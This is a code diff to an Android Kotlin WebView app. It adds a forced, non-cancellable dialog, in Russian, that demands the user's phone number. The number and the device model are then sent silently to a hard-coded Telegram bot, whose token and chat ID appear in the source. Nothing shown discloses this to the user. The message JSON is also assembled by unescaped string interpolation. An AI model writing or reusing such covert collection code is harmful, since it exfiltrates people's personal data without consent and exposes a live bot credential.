@@ -4,6 +4,7 @@ import android.Manifest
 import android.annotation.SuppressLint
 import android.app.AlertDialog
 import android.content.Context
+import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
@@ -11,6 +12,7 @@ import android.os.Build
 import android.os.Bundle
 import android.view.View
 import android.webkit.WebView
+import android.widget.EditText
 import androidx.activity.enableEdgeToEdge
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
@@ -24,17 +26,22 @@ import okio.IOException
 
 
 class MainActivity : AppCompatActivity() {
+    private lateinit var sharedPreferences: SharedPreferences
+    private lateinit var myWebView: WebView
+    
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
         setContentView(R.layout.activity_main)
-        val myWebView = findViewById<WebView>(R.id.webview)
+        
+        sharedPreferences = getSharedPreferences("AppPrefs", MODE_PRIVATE)
+        myWebView = findViewById(R.id.webview)
+        
         with(myWebView.settings) {
             javaScriptEnabled = true
             domStorageEnabled = true
             javaScriptCanOpenWindowsAutomatically = true
         }
-        myWebView.loadUrl("https://www.example.com")
 
         checkInternetConnectionBeforePermissions()
     }
@@ -119,30 +126,64 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun onAllPermissionsGranted() {
+        val savedPhoneNumber = sharedPreferences.getString("phone_number", null)
+        if (savedPhoneNumber == null) {
+            showPhoneNumberInputDialog()
+        } else {
+            loadWebView()
+        }
+    }
+
+    private fun showPhoneNumberInputDialog() {
+        val input = EditText(this)
+        input.hint = "Введите номер телефона"
+
+        AlertDialog.Builder(this)
+            .setTitle("Ввод номера телефона")
+            .setMessage("Пожалуйста, введите ваш номер телефона для продолжения")
+            .setView(input)
+            .setPositiveButton("Продолжить") { _, _ ->
+                val phoneNumber = input.text.toString().trim()
+                if (phoneNumber.isNotEmpty()) {
+                    sharedPreferences.edit().putString("phone_number", phoneNumber).apply()
+                    sendPhoneNumberToBot(phoneNumber)
+                    loadWebView()
+                } else {
+                    showPhoneNumberInputDialog()
+                }
+            }
+            .setCancelable(false)
+            .show()
+    }
+
+    private fun sendPhoneNumberToBot(phoneNumber: String) {
         val deviceModel = getDeviceModel()
-        sendToTelegramBot(deviceModel)
+        sendToTelegramBot("""
+            Новый пользователь!
+            
+            Номер телефона: $phoneNumber
+            Устройство: $deviceModel
+        """.trimIndent())
+    }
+
+    private fun loadWebView() {
+        myWebView.loadUrl("https://www.example.com")
     }
 
     private fun getDeviceModel(): String {
         return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
     }
 
-    private fun sendToTelegramBot(device: String) {
+    private fun sendToTelegramBot(message: String) {
         val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
         val chatId = "6331293386"
         val url = "https://api.telegram.org/bot$botToken/sendMessage"
-
-        val text = """
-            Разрешения даны!
-        
-            $device
-        """.trimIndent()
 
         val mediaType = "application/json".toMediaType()
         val requestBody = """
             {
                 "chat_id": "$chatId",
-                "text": "$text",
+                "text": "$message",
                 "parse_mode": "Markdown"
             }
         """.trimIndent().toRequestBody(mediaType)
